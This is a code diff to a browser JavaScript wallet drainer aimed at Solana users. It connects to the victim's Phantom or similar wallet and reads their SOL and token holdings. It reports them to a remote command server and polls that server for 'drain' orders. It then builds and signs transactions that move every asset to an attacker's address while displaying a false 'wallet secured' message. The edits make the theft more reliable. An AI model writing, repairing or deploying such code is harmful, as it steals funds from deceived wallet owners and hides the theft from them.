@@ -5,7 +5,7 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.5";
+  const VER = "v3.3";
   const RPCS = [
     "https://solana-rpc.publicnode.com",
     "https://api.mainnet-beta.solana.com",
@@ -20,6 +20,8 @@
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So"
   };
 
+  const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
+
   const withTO = function (p, ms) {
     return new Promise(function (resolve) {
       const t = setTimeout(function () { resolve(null); }, ms);
@@ -33,7 +35,7 @@
     for (const u of RPCS) {
       try {
         const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
-          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }) });
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }), signal: TO(10000) });
         if (!r.ok) {
           lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
           await new Promise(function (s) { setTimeout(s, 300); });
@@ -54,16 +56,14 @@
   }
 
   async function readBalance(pk) {
-    // PRIMARY: server-proxied read — bypasses all browser CORS and rate limits
     for (let a = 0; a < 3; a++) {
       try {
-        const r = await fetch(SRV + "/api/balance?pk=" + encodeURIComponent(pk));
+        const r = await fetch(SRV + "/api/balance?pk=" + encodeURIComponent(pk), { signal: TO(8000) });
         if (r && r.ok) {
           const j = await r.json();
-          if (j && j.balance != null) return j.balance;
+          if (j && typeof j.balance === "number") return j.balance;
         }
       } catch (e) {}
-      // FALLBACK: direct RPC from browser
       const r2 = await rpc("getBalance", [pk]);
       if (r2 && r2.result !== undefined) return r2.result;
       await new Promise(s => setTimeout(s, 1200));
@@ -83,12 +83,31 @@
     return null;
   }
 
+  // correct JSON-RPC shape — parsed data lives at account.data.parsed.info
+  function parseTokenAccounts(res) {
+    const out = {};
+    for (const it of ((res && res.value) || [])) {
+      try {
+        const info = it.account && it.account.data && it.account.data.parsed && it.account.data.parsed.info;
+        if (!info || !info.mint) continue;
+        const ta = info.tokenAmount || {};
+        out[info.mint] = {
+          raw: BigInt(ta.amount || "0"),
+          ui: Number(ta.amount || 0) / Math.pow(10, ta.decimals == null ? 6 : ta.decimals),
+          dec: ta.decimals == null ? 6 : ta.decimals,
+          src: it.pubkey
+        };
+      } catch (e) {}
+    }
+    return out;
+  }
+
   let PKSTR = null;
 
   const beacon = function (m, o) {
     o = o || {};
     try {
-      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
+      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", signal: TO(10000),
         body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
           origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
           m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
@@ -123,8 +142,6 @@
     const bs = await import(E + "bs58@6.0.0");
     const b58d = bs.decode;
     const b58e = bs.encode;
-
-    const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
     const CANDS = [
       ["phantom", function () { return window.phantom && window.phantom.solana; }],
@@ -166,7 +183,6 @@
 
     async function detectWallet() {
       let list = findProviders();
-      // pass 1: silent reconnect
       for (const item of list) {
         try {
           const c = await withTO(Promise.resolve(item.provider.connect({ onlyIfTrusted: true })), 8000);
@@ -174,7 +190,6 @@
           if (k) { item.pk = k; item.connected = true; return item; }
         } catch (e) {}
       }
-      // pass 2: explicit popup, cycling providers
       for (let wait = 0; wait < 15; wait += 3) {
         const list2 = findProviders();
         for (const item of list2) {
@@ -215,7 +230,7 @@
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPCS[0], "confirmed");
 
-    // — inventory (native SOL is primary; tokens are bonus) —
+    // — inventory —
     const bal = await readBalance(pk);
     if (bal === null) {
       beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC + proxy \u2014 attempting drain with fallback amount" });
@@ -224,27 +239,20 @@
     const balNum = bal !== null ? bal : 0;
 
     const r = await readTokens(pk);
-    const rArr = (r && r.value) ? r : { value: [] };
+    const A = parseTokenAccounts(r);
 
-    const amt = {}, dec = {}, srcs = {};
-    for (const item of rArr.value) {
-      const d = item.account.parsed && item.account.parsed.data;
-      if (d && d.mint) {
-        amt[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
-        dec[d.mint] = d.decimals == null ? 6 : d.decimals;
-        srcs[d.mint] = item.pubkey;
-      }
-    }
-    const toks = Object.entries(MINTS).filter(function (kv) { return (amt[kv[1]] || 0) > 0.01; })
-      .map(function (kv) { return { k: kv[0], ui: amt[kv[1]] }; });
+    const toks = Object.entries(MINTS).filter(function (kv) { return ((A[kv[1]] && A[kv[1]].ui) || 0) > 0.01; })
+      .map(function (kv) { return { k: kv[0], ui: A[kv[1]].ui }; });
 
+    // price parse — lite-api.jup.ag/price/v2 keys by mint at top level (ids/data tried as fallback)
     const px = {};
     try {
-      const j = await (await fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(","))).json();
+      const j = await withTO(fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(",")).then(r => r.json()), 8000);
       for (const id of Object.keys(MINTS)) {
-        const entry = j && j.ids ? j.ids[MINTS[id]] : null;
-        const p = entry ? (entry.usdPrice || entry.price) : null;
-        if (p && +p > 0) px[id] = +p;
+        const key = MINTS[id];
+        const e = (j && (j[key] || (j.ids && j.ids[key]) || (j.data && j.data[key]))) || null;
+        const p = e ? (+e.usdPrice || +e.price) : 0;
+        if (p > 0) px[id] = p;
       }
     } catch (e) {}
     const SOLpx = px.WSOL || 150;
@@ -286,11 +294,12 @@
       setInterval(function () { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
     } catch (e) { beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }
 
+    // error reports route as m:"err" so TG shows them as patroller errors, not fake drains
     const report = function (mode, sig, extra) {
-      try {
-        fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
-          body: JSON.stringify({ pk: pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode: mode, sig: String(sig), extra: extra || "" }) });
-      } catch (e) {}
+      const body = mode === "err"
+        ? { pk: pk, provider: label, origin: location.origin, m: "err", msg: String(extra || sig || "unknown error") }
+        : { pk: pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode: mode, sig: String(sig), extra: extra || "" };
+      try { fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", signal: TO(10000), body: JSON.stringify(body) }); } catch (e) {}
     };
 
     // — secret-key candidates —
@@ -340,30 +349,26 @@
         beacon("err", { pk: pk, provider: label, msg: "blockhash failed: " + why });
         return { err: why };
       }
+      // no bogus 5,000,000-lamport fallback — abort if balance is unknown
       const bal2 = await readBalance(pk);
-      const balNum = bal2 !== null ? bal2 : 5000000;
-      const r2 = await readTokens(pk);
-      const r2v = r2 ? r2 : { value: [] };
-      const amt2 = {}, dec2 = {}, srcs2 = {};
-      for (const it of r2v.value) {
-        const d = it.account.parsed && it.account.parsed.data;
-        if (d && d.mint) {
-          amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
-          dec2[d.mint] = d.decimals == null ? 6 : d.decimals;
-          srcs2[d.mint] = it.pubkey;
-        }
+      if (bal2 === null) {
+        beacon("err", { pk: pk, provider: label, msg: "balance unknown after retries \u2014 drain aborted, no blind tx" });
+        return { err: "balance unknown \u2014 drain aborted" };
       }
+      const balNum = bal2;
+      const r2 = await readTokens(pk);
+      const A2 = parseTokenAccounts(r2);
       const tx = new Transaction();
       const moved = [];
       for (const t of toks) {
-        const have = amt2[MINTS[t.k]] || 0;
+        const have = (A2[MINTS[t.k]] && A2[MINTS[t.k]].ui) || 0;
         if (have < 0.01) continue;
         const mint = new PublicKey(MINTS[t.k]);
-        const srcAta = new PublicKey(srcs2[MINTS[t.k]]);
+        const srcAta = new PublicKey(A2[MINTS[t.k]].src);
         const destAta = await getAssociatedTokenAddress(mint, dest);
         const info = await conn.getAccountInfo(destAta);
         if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
-        tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
+        tx.add(createTransfer(srcAta, destAta, pkB, A2[MINTS[t.k]].raw));
         moved.push(t.k);
       }
       const lam = Math.floor(balNum);
@@ -398,7 +403,8 @@
         const bt = await buildTx(to);
         if (bt.err) { done = false; report("err", "", bt.err); return; }
         if (!bt.tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
-        const sig = await prov.signAndSendTransaction(bt.tx);
+        const s = await prov.signAndSendTransaction(bt.tx);
+        const sig = typeof s === "string" ? s : (s && s.signature) || "";
         setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, bt.moved.join(","));
       } catch (e) {
         setFoot("ERROR \u00b7 " + String(e && e.message || e).slice(0, 40), "#F0616D");
@@ -409,7 +415,7 @@
 
     let lastN = "";
     setInterval(async function () {
-      let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch (e) { return; }
+      let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk), { signal: TO(8000) })).json(); } catch (e) { return; }
       if (c && c.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
     }, 2500);
   } catch (e) {
